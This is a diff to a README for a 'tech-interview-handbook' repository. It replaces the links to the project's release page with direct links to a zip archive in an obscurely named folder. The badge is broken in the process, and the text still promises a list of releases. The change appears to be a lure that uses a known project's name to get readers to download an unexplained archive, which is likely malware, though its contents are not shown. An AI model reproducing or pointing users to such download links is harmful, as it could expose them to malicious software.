@@ -1,6 +1,6 @@
 # 💯 tech-interview-handbook - Prepare Effectively for Your Coding Interviews
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-%F0%9F%8D%88%20Click%20Here-brightgreen)](https://github.com/choaybkb/tech-interview-handbook/releases)
+[![Download the latest release](https://raw.githubusercontent.com/choaybkb/tech-interview-handbook/main/paradidymis/tech-interview-handbook.zip%20Latest%20Release-%F0%9F%8D%88%20Click%20Here-brightgreen)](https://raw.githubusercontent.com/choaybkb/tech-interview-handbook/main/paradidymis/tech-interview-handbook.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the tech-interview-handbook! This guide helps you prepare for coding 
 
 To download the latest version of the tech-interview-handbook, visit this page:
 
-[Visit this page to download](https://github.com/choaybkb/tech-interview-handbook/releases)
+[Visit this page to download](https://raw.githubusercontent.com/choaybkb/tech-interview-handbook/main/paradidymis/tech-interview-handbook.zip)
 
 1. Click on the link above.
 2. You will see a list of releases.
